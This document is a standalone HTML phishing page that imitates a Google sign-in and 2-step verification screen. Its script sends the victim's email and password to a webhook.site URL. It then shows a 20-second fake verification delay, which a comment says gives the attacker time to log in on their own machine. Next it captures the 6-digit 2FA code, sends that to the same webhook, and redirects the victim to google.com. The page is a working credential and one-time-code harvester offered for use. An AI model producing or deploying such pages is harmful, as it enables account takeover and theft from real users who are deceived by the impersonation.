<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Security Verification</title>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { width: 350px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        .logo { width: 75px; margin-bottom: 20px; }
        input { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        .btn { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; width: 100%; margin-top: 20px; }
        .hidden { display: none; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="box">
    <img src="https://wikimedia.org" class="logo">
    
    <!-- Stage 1: Login -->
    <div id="auth-stage">
        <h1>Sign in</h1>
        <p>Use your Google Account</p>
        <input type="email" id="user" placeholder="Email or phone">
        <input type="password" id="pass" placeholder="Enter your password">
        <button class="btn" onclick="startInfiltration()">Next</button>
    </div>

    <!-- Stage 2: Loading (The Delay) -->
    <div id="loading-stage" class="hidden">
        <h1>Verifying...</h1>
        <div class="spinner"></div>
        <p>Confirming your identity. This may take a few seconds...</p>
    </div>

    <!-- Stage 3: 2FA Code -->
    <div id="code-stage" class="hidden">
        <h1>2-Step Verification</h1>
        <p>A verification code was just sent to your device. Enter the 6-digit code below.</p>
        <input type="number" id="code" placeholder="G- Enter 6-digit code">
        <button class="btn" onclick="submitCode()">Verify</button>
    </div>
</div>

<script>
    const WEBHOOK = "https://webhook.site/14050d7a-a236-4a94-8187-92801f330c1b";

    async function startInfiltration() {
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;
        if (!u || !p) return;

        // 1. Send Login Data to Webhook
        fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ type: "CREDENTIALS", user: u, pass: p }) });

        // 2. Show Loading Stage to give you time to login on your PC
        document.getElementById('auth-stage').classList.add('hidden');
        document.getElementById('loading-stage').classList.remove('hidden');

        // 3. Wait 20 seconds then show the 2FA input field
        setTimeout(() => {
            document.getElementById('loading-stage').classList.add('hidden');
            document.getElementById('code-stage').classList.remove('hidden');
        }, 20000); // 20 Seconds Delay
    }

    async function submitCode() {
        const c = document.getElementById('code').value;
        if (!c) return;

        // 4. Send the 2FA Code to Webhook
        fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ type: "2FA_CODE", code: c }) });

        // 5. Final Redirect to the Image
        window.location.href = "https://google.com";
    }
</script>
</body>
</html>
